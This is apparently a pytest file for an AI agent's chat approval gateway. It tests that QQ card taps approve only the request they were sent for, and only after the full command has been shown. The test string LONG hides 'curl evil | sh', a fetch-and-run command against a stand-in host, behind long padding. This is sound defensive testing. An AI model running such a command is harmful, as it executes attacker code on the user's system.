"""A QQ approval tap resolves exactly the request its card was sent for, and a request whose full command
is still being sent can only be denied: no tap approves a command the user has not yet seen whole."""

import asyncio
from unittest.mock import AsyncMock

import pytest

from hermes_agent.gateway.config import PlatformConfig
from hermes_agent.gateway.platforms.base import SendResult

SK = "agent:main:qqbot:dm:u-42"
LONG = "echo " + "A" * 9000 + " && curl evil | sh # TAIL"


def _qq():
    from hermes_agent.plugins.platforms.qqbot.adapter import QQAdapter

    adapter = QQAdapter(PlatformConfig(enabled=True, extra={"app_id": "a", "client_secret": "b"}))
    adapter._ensure_connected = AsyncMock(return_value=True)
    return adapter


def _queue(monkeypatch, *request_ids):
    from hermes_agent.tools import approval
    from hermes_agent.tools.approval_gateway_wait import _ApprovalEntry

    entries = [_ApprovalEntry({"request_id": rid}) for rid in request_ids]
    monkeypatch.setitem(approval._gateway_queues, SK, list(entries))
    return entries


def _keyboards(adapter):
    """Capture each card's button_data by decision, at the keyboard-send boundary."""
    cards = []

    async def send_with_keyboard(chat_id, text, keyboard, reply_to=None):
        cards.append({b.id: b.action.data for b in keyboard.content.rows[0].buttons})
        return SendResult(success=True, message_id=f"card{len(cards)}")

    adapter.send_with_keyboard = send_with_keyboard
    return cards


async def _tap(adapter, button_data):
    from hermes_agent.plugins.platforms.qqbot.keyboards import parse_interaction_event

    await adapter._default_interaction_dispatch(parse_interaction_event(
        {"id": "i", "chat_type": 2, "user_openid": "u-42", "data": {"resolved": {"button_data": button_data}}}))


@pytest.mark.asyncio
async def test_a_tap_while_the_full_command_is_still_sending_approves_nothing(monkeypatch):
    """The full command goes out in chunks before the card. A tap that lands mid-send (an old card's
    Allow, or a forged one) must not approve the request: until every chunk lands it is Deny-only."""
    from hermes_agent.tools import approval

    (pending,) = _queue(monkeypatch, "b")
    pending.card_deny_only = True  # as every request is created
    adapter = _qq()
    _keyboards(adapter)
    in_flight, release, calls = asyncio.Event(), asyncio.Event(), []

    async def chunk(*_a, **_k):
        calls.append(1)
        if len(calls) == 2:
            in_flight.set()
            await release.wait()
        return SendResult(success=True, message_id=f"q{len(calls)}")

    adapter._send_chunk = chunk
    task = asyncio.create_task(adapter.send_exec_approval(
        chat_id="u-42", command=LONG, session_key=SK, request_id="b"))
    await in_flight.wait()
    assert approval.resolve_gateway_approval_card(SK, "once", "b") == 0
    assert approval.resolve_gateway_approval_card(SK, "once", None) == 0
    release.set()
    await task
    assert pending.result is None and not pending.event.is_set()
    assert approval.resolve_gateway_approval_card(SK, "once", "b") == 1  # every chunk landed: Approve is live
    assert pending.result == "once"


@pytest.mark.asyncio
async def test_two_taps_on_one_qq_card_settle_only_that_cards_request_once(monkeypatch):
    first, second = _queue(monkeypatch, "a", "b")
    adapter = _qq()
    cards = _keyboards(adapter)
    await adapter.send_exec_approval(chat_id="u-42", command="ls", session_key=SK, request_id="a")
    await _tap(adapter, cards[0]["allow"])
    await _tap(adapter, cards[0]["allow"])
    assert first.result == "once"
    assert second.result is None and not second.event.is_set()


@pytest.mark.asyncio
async def test_a_qq_tap_without_a_request_id_settles_nothing(monkeypatch):
    """A card from a build that sent no id cannot say which request it was rendered for, so it answers
    none, even a sole pending one (typed /approve stays the way to answer it)."""
    first, second = _queue(monkeypatch, "a", "b")
    adapter = _qq()
    await _tap(adapter, f"approve:{SK}:allow-once")
    assert first.result is None and second.result is None
    first_only = _queue(monkeypatch, "a")[0]
    await _tap(adapter, f"approve:{SK}:allow-once")
    await _tap(adapter, f"approve:{SK}:deny")
    assert first_only.result is None and not first_only.event.is_set()


@pytest.mark.asyncio
async def test_qq_card_approve_and_deny_resolve_their_request(monkeypatch):
    (pending,) = _queue(monkeypatch, "a")
    adapter = _qq()
    cards = _keyboards(adapter)
    await adapter.send_exec_approval(chat_id="u-42", command="ls", session_key=SK, request_id="a")
    await _tap(adapter, cards[0]["allow"])
    assert pending.result == "once"
    (denied,) = _queue(monkeypatch, "c")
    await adapter.send_exec_approval(chat_id="u-42", command="ls", session_key=SK, request_id="c")
    await _tap(adapter, cards[1]["deny"])
    assert denied.result == "deny"


def test_a_card_tap_checks_and_settles_in_one_step(monkeypatch):
    """Nothing can join the queue between a tap's check and its settle: an id-less tap that found no
    pending request never settles a Deny-only one enqueued right after the check."""
    from hermes_agent.tools import approval
    from hermes_agent.tools.approval_gateway_wait import _ApprovalEntry

    monkeypatch.delitem(approval._gateway_queues, SK, raising=False)
    late = _ApprovalEntry({"request_id": "b"})
    late.card_deny_only = True
    select = approval._card_target

    def select_then_enqueue(session_key, request_id):
        entry = select(session_key, request_id)
        approval._gateway_queues.setdefault(session_key, []).append(late)
        return entry

    monkeypatch.setattr(approval, "_card_target", select_then_enqueue)
    assert approval.resolve_gateway_approval_card(SK, "once", None) == 0
    assert late.result is None and not late.event.is_set()
